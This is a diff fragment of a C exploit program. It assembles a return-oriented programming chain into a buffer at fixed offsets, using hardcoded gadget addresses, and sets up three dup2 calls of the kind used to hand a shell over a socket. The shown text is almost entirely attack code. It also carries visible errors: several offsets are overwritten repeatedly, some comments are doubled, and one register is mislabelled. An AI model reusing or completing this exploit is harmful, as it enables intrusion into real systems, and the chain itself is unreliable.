@@ -217,46 +217,46 @@ int main(void)
   strcpy(bufr + 411, dup_call_arg_addr);
   strcpy(bufr + 415, write_at_ecx_from_edx);
   // pop off second arg address into ecx
-  strcpy(bufr + 419, inc_edx); // edx has 1
+  strcpy(bufr + 419, inc_edx); //  // 0xbbb7b88a, edx has 1
   strcpy(bufr + 423, pop_ecx); // 0xbbaa422
   strcpy(bufr + 427, dup_call2_arg_addr);
   strcpy(bufr + 431, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop off third arg address into ecx
-  strcpy(bufr + 435, inc_edx); // edx has 2
+  strcpy(bufr + 435, inc_edx); //  // 0xbbb7b88a, edx has 2
   strcpy(bufr + 439, pop_ecx); // 0xbbaa422
   strcpy(bufr + 443, dup_call3_arg_addr);
   strcpy(bufr + 447, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // all 3 dup2 calls should have proper num args
-  strcpy(bufr + 451, inc_edx); // ecx has 3
+  strcpy(bufr + 451, inc_edx); //  // 0xbbb7b88a, ecx has 3
   // pop first 3 arg address into ecx
   strcpy(bufr + 455, pop_ecx); // 0xbbaa422
   strcpy(bufr + 459, dup_call_3_addr);
   strcpy(bufr + 463, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop second 3 arg address into ecx
   strcpy(bufr + 455, pop_ecx); // 0xbbaa422
-  strcpy(bufr + 459, dup_call_3_addr);
+  strcpy(bufr + 459, dup_call2_3_addr);
   strcpy(bufr + 463, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop third 3 arg address into ecx
   strcpy(bufr + 455, pop_ecx); // 0xbbaa422
-  strcpy(bufr + 459, dup_call_3_addr);
+  strcpy(bufr + 459, dup_call3_3_addr);
   strcpy(bufr + 463, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // all 3 dup2 should have proper file descriptor
   // ---------------------------------------------------------- call #1 0xbfbf671d
-  strcpy(bufr + 467, trap); // 0xbba9b6e5, location is 0xbfbf6900
+  strcpy(bufr + 467, trap); // 0xbba9b6e5, location is 0xbfbf68f0
   strcpy(bufr + 471, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
   strcpy(bufr + 475, "\x01\x01\x01\x01");
   // 4 byte value 0
   strcpy(bufr + 479, "\x01\x01\x01\x01");
   // ---------------------------------------------------------- call #2
-  strcpy(bufr + 483, trap); // 0xbba9b6e5, location is 0xbfbf6ba0
+  strcpy(bufr + 483, trap); // 0xbba9b6e5, location is 0xbfbf6900
   strcpy(bufr + 487, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
   strcpy(bufr + 491, "\x01\x01\x01\x01");
   // 4 byte value 1
   strcpy(bufr + 495, "\x01\x01\x01\x01");
   // ---------------------------------------------------------- call #3
-  strcpy(bufr + 499, trap); // 0xbba9b6e5, location is 0xbfbf6bb6
+  strcpy(bufr + 499, trap); // 0xbba9b6e5, location is 0xbfbf6910
   strcpy(bufr + 503, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
   strcpy(bufr + 507, "\x01\x01\x01\x01");
